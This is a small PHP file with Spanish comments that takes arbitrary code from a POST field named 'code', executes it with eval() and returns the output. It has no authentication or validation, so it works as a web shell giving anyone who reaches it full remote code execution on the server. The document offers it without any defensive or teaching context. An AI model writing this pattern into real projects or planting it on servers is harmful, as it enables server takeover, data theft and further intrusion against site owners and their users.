<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = $_POST['code'];
    
    // Ejecutar el código PHP
    ob_start();
    eval("?>$code<?php ");
    $output = ob_get_clean();
    
    // Devolver el resultado
    echo $output;
}
?>